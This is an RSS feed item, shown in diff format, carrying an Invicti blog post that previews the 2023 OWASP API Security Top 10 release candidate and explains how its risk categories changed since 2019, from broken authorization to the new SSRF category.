+      <description><![CDATA[<p>A new version of the OWASP API Security Top 10 is due this year. The list is a community-driven project to define and prioritize the top web API security risks commonly found in testing. Before the final list arrives, here’s a quick look at the current release candidate version.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/whats-coming-in-owasp-api-security-top-10-for-2023/">What’s coming in the OWASP API Security Top 10 for 2023</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<p>A new edition of the <a href="https://owasp.org/www-project-api-security/" target="_blank" rel="noreferrer noopener nofollow">OWASP API Security Top 10</a> is just around the corner, so we decided to take a sneak peek at the work in progress at OWASP to see what’s been trending since the list was first compiled in 2019. While the current work has release candidate status, we’re not expecting any significant changes – and will, of course, follow up with a deep dive as soon as the official list is announced.</p>
+
+
+
+<h2>Evolution rather than revolution</h2>
+
+
+
+<p>While, at first glance, many of the category names are different, all the risk categories from the previous edition are still here in one form or another. In the four years that have passed, APIs have gone from extensions of core functionality to a permanent staple of web application architecture. This has brought security issues into sharp focus, allowing categories to be redefined to better match the specific risks observed in actual web environments.</p>
+
+
+
+<p>Overall, the release candidate list includes four categories that haven’t changed since 2019, five with changes in naming or scope, and one old standby that makes a new appearance on this particular list.</p>
+
+
+
+<h2>Broken auth still top of the pile</h2>
+
+
+
+<p>The whole purpose of an application programming interface (API) is to provide access to something in or from the application, so access control has always been the top security concern for APIs. Accordingly, the #1 risk category hasn’t changed from 2019: <em>Broken Object-Level Authorization</em>. Especially when combined with <a href="https://www.invicti.com/learn/insecure-direct-object-references-idor/">insecure direct object references</a>, access control failures at the application object level can result in data exposure (<a href="https://www.invicti.com/blog/web-security/idor-everywhere-dangers-of-direct-object-references/">as in the Optus breach</a>), allowing malicious actors to freely extract sensitive data via the API.</p>
+
+
+
+<p>Closely related is another access control risk that hasn’t changed in name or rank since 2019, namely <em>Broken Function-Level Authorization</em> at #5. This category covers weaknesses that expose application functionality rather than data, though in practice, there is significant overlap between the two. For example, if an attacker can access the export operation for customer records, they could extract sensitive information in bulk even if they cannot access each customer record object separately.</p>
+
+
+
+<p>Before any authorization comes authentication, so <em>Broken Authentication</em> had to make the list once again, remaining at #2 (and slightly renamed from <em>Broken User Authentication</em>). This category encompasses all sorts of weaknesses that could allow an attacker to act as a valid user, whether by permitting credential stuffing for brute-force access, failing to verify token signatures, or simply allowing unauthenticated access in some circumstances.</p>
+
+
+
+<h2>API management as difficult as ever</h2>
+
+
+
+<p>Other risks that continue unchanged as of this writing are related to API management and administration. <em>Security Misconfigurations</em> remain at #7, covering security issues at any level of the API technology stack that are not directly caused by flaws in the API or application itself. These include unpatched systems, missing or inconsistent security headers, improper permissions on cloud services, and many other configuration-related security risks across complex API stacks.</p>
+
+
+
+<p><em>Improper Inventory Management</em> (previously “asset management”) continues at #9 and will likely remain on the list due to the inherent challenges of managing APIs across their entire lifecycle. As interfaces and their underlying applications both undergo changes (sometimes independently), any gaps in version control and documentation can expose additional attack surfaces in the form of deprecated APIs that are still accessible or undocumented API endpoints that go unnoticed during testing.</p>
+
+
+
+<p>APIs are all about automation, so failures to control and limit usage are another mainstay of the API security top 10, slightly renamed to <em>Unrestricted Resource Consumption</em> at #4. These broadly fall into two main categories. Firstly, unlimited API access can expose web services and applications to denial of service (DoS) attacks caused by resource exhaustion when a server in the API stack cannot handle any more requests. Just as importantly, a lack of suitable rate limiting can allow attackers to mount brute-force attacks to, for example, break passwords or enumerate data records.</p>
+
+
+
+<h2>Broadening risk horizons</h2>
+
+
+
+<p>Three risk categories have been broadened and redefined to cover a wider range of security issues. Compared to the 2019 list, excessive data exposure and mass assignment risks are now both included under <em>Broken Object Property Level Authorization</em> at #3. This is closely related to object-level authorization failures but applies at a more granular level, where defining and enforcing access control is much harder. Even with proper access control to, say, customer data records, you still need to define who can perform which operations on which data fields, and whether they can import, export, or modify data in bulk.</p>
+
+
+
+<p>Renamed from <em>Insufficient Logging &amp; Monitoring</em>, we now see the more descriptive <em>Lack of Protection from Automated Threats</em> category at #8. Malicious bots and other automated attacks make up a large part of web traffic, and APIs are specifically designed for automated access, so it’s crucial to monitor API usage and have the ability to respond if suspicious behaviors are detected. This category is not so much about protection on a technical level as it is about identifying and blocking malicious business logic flows that could result in undesirable outcomes. A typical (and topical) example would be a ticket site not preventing bots from immediately buying up all the tickets for a high-profile event.</p>
+
+
+
+<p>Injection flaws have been moved under the wider heading of <em>Unsafe Consumption of APIs</em> (at #10). In this case, “unsafe consumption” refers to using data retrieved from an API without sanitizing and validating it to the same standard as user-supplied data. Especially for communication between APIs (whether internal or external), there is a risk that developers will implicitly trust API behavior without checking if it’s secure. Apart from risking injection attacks via unsanitized data, this could also create encryption gaps or exhaust application resources if the consumed resource provides data at a higher rate than expected.</p>
+
+
+
+<h2>New yet very old: SSRF</h2>
+
+
+
+<p>The only new category so far, and also the only vulnerability placed in its own category, is <em>Server Side Request Forgery</em>, currently sitting at #6. This mirrors the choice made for the last <a href="https://www.invicti.com/blog/web-security/what-owasp-top-ten-2021-categories-mean/">OWASP Top 10 in 2021</a>, where SSRF also got its own category for the first time. In the context of APIs, <a href="https://www.invicti.com/learn/server-side-request-forgery-ssrf/">server-side request forgery vulnerabilities</a> allow attackers to smuggle URLs through an API and trick a back-end server into sending a request to that URL. This class of vulnerabilities can be especially dangerous in modern application architectures, where containerized components in the cloud often communicate through APIs over predictable paths, thus greatly increasing the potential for SSRF.</p>
+
+
+
+<h2>Watch this space</h2>
+
+
+
+<p>While it may be some time before the final API Security Top 10 arrives, the current release candidate list is unlikely to change much. All the major risk areas for modern APIs are already covered, and the overall trend seems to be towards making the categories more generic to be used more as best-practice guidelines and less as a vulnerability checklist (which was the approach taken for the main OWASP Top 10 list in 2021). That said, the details and examples provided for some categories still vary in terms of format and depth of detail, so it’s likely that work will continue there. We’ll take a detailed technical look at the final list when it arrives, as we did for the <a href="https://www.invicti.com/blog/web-security/owasp-api-security-top-10/">2019 API Security Top 10</a>.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/whats-coming-in-owasp-api-security-top-10-for-2023/">What’s coming in the OWASP API Security Top 10 for 2023</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
